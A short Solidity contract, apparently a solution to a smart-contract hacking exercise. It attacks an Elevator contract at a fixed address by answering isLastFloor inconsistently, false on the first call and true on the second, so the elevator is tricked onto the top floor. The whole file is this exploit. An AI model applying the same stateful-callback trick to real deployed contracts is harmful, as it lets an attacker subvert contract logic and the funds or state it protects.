// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10; // Latest solidity version

import './Elevator.sol';

contract HackElevator is Building {
  Elevator public originalContract = Elevator(0x9053035BFd8b391CD30a9246d175E659AE518d31); 
    bool public switchFlipped =  false; 

    function hack() public {
        originalContract.goTo(1);
    }
    
    function isLastFloor(uint) public returns (bool) {
      // first call
      if (! switchFlipped) {
        switchFlipped = true;
        return false;
        // second call
      } else {
        switchFlipped = false;
        return true;
      }
    }
    
}